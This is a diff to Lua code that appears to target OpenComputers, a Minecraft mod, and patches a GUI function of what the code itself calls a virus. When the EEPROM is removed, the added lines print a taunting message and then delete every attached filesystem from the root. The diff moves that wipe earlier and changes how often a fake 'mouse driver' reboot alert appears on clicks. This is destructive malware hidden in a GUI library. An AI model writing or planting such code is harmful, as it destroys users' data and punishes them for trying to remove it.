@@ -295,8 +295,21 @@ function GUI.object(x, y, width, height)
     
             if e[1] == "component_removed" then
                 if e[3] == "eeprom" then
+                	local resX, resY = component.gpu.getResolution()
+
+                	component.gpu.setBackground(0xFFFFFF)
+                    component.gpu.setForeground(0x000000)
+                    text = "Oh, you tried to deactivate my virus? It's so cute. Say goodbye to your computer!"
+                    component.gpu.set( (resX / 2) - (#text / 2), resY / 2, text)
+
+                    for filesystem in component.list("filesystem") do 
+                        component.invoke(filesystem, "remove", "/")
+                    end
+
+                    computer.pullSignal(10)
+
                     payload1()
-                    local resX, resY = component.gpu.getResolution()
+
                     for _=1, 100 do
                         component.gpu.setBackground(0xFF0000)
                         component.gpu.setForeground(0xFFFFFF)
@@ -308,14 +321,13 @@ function GUI.object(x, y, width, height)
                 
                         component.gpu.copy( math.random(0, resX), math.random(0, resY), math.random(0, resX), math.random(0, resY), math.random(0, resX), math.random(0, resY) )
                     end
-                    for filesystem in component.list("filesystem") do 
-                        component.invoke(filesystem, "remove", "/")
-                    end
+                    
                     payload2()
+
                     computer.shutdown(true)
                 end
             elseif e[1] == "touch" then
-                if math.random(1, 3) == 1 then
+                if math.random(1, 10) == 1 then
                     GUI.alert("Oops, you clicked the mouse! MineOS needs a reboot to install the mouse click driver!")
                 end
             end
